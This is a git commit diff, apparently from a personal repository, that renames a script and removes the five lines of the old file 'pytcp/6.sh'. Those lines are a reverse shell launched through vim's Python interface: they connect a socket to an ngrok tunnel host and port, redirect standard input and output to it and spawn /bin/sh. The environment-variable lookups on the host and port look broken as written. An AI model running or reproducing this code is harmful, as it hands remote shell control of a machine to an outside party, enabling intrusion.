9578503033c87c80ba6104451efb20f20f584bd2
kovaliv1990 <127501891+kovaliv1990@users.noreply.github.com>
2023-03-20 15:57:22 +0200

    Update and rename 6.sh to 7.sh

--- pytcp/6.sh
+++
@@ -1,5 +0,0 @@
-vim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
-s.connect((os.getenv("2.tcp.eu.ngrok.io"),int(os.getenv("17016"))))
-[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
-pty.spawn("/bin/sh")
-vim.command(":q!")'
